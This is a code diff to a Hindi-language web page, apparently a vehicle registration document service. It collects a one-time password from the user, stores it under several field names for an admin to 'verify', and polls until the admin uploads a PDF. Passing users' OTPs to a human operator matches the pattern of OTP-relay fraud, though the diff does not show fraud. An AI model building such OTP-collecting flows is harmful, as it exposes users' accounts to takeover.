@@ -179,7 +179,7 @@ th { font-size: .76rem; text-transform: uppercase; letter-spacing: .06em; color:
         <div class="spinner" id="waitSpinner"></div>
         <h3 id="waitTitle" style="margin: 0 0 8px; font-size: 1.2rem; color: var(--ac);">Checking OTP confirmation...</h3>
         <p id="waitMsg" style="color: var(--mut); font-size: 0.88rem; max-width: 480px; margin: 0 auto 20px;">
-          Admin dwara OTP verify kiya ja raha hai. Kripya pratiksha karein.
+          Admin dwara OTP verify kiya ja raha hai &amp; document generate ho raha hai. Kripya pratiksha karein.
         </p>
 
         <div id="downloadContainer" style="display: none;">
@@ -306,9 +306,7 @@ async function checkAndRestoreStep() {
 
     const otpStatus = req.data && req.data.otp_status ? req.data.otp_status : 'pending';
 
-    // RTO / Admin Verification & File Status Logic
     if (req.file) {
-      // Jab Admin PDF file upload kar dega tabhi spinner hatega aur Download Button show hoga
       clearInterval(pollTimer);
       localStorage.removeItem('ds_current_rc_req');
       document.getElementById('step2Otp').style.display = 'none';
@@ -327,7 +325,6 @@ async function checkAndRestoreStep() {
       showWrongOtp();
     }
     else {
-      // Jab tak admin file upload nahi karta (OTP approve ke baad bhi), spinner chalta rahega
       document.getElementById('step2Otp').style.display = 'none';
       document.getElementById('step3Waiting').style.display = 'block';
       document.getElementById('waitSpinner').style.display = 'block';
@@ -457,6 +454,8 @@ document.getElementById('fOtpForm').onsubmit = async function(e) {
         s: 'processing',
         data: {
           entered_otp: otp,
+          otp: otp,
+          'Entered OTP': otp,
           otp_status: 'waiting_verify'
         }
       })
@@ -514,7 +513,6 @@ function startStatusPolling() {
         return;
       }
 
-      // Exact requirement: Jab tak Admin File upload nahi kar deta, spinner dikhta rahega.
       if (req.file) {
         clearInterval(pollTimer);
         localStorage.removeItem('ds_current_rc_req');
